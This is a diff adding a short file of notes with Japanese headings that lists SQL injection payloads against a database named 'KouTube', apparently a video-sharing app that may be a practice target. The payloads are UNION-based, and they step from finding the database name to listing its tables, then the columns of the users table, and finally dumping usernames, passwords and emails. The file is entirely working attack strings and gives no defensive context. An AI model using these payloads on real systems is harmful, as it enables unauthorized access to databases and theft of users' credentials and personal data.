@@ -1,0 +1,20 @@
+SQL
+DB名の取得
+
+' AND 1=2 UNION SELECT 1, 2, DATABASE(), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' --' 
+
+
+テーブル名取得
+
+' AND 1=2 UNION SELECT 1, 2, table_name, 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.tables WHERE table_schema = 'KouTube' -- '
+
+
+usersテーブルのカラム表示
+
+' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' -- '
+
+
+カラムの中身表示（ユーザー名、パスワード、email）
+
+' AND 1=2 UNION SELECT id, id, CONCAT_WS('\n', username, password, email), '', '', 0, NOW() FROM users ORDER BY id ASC -- '
+
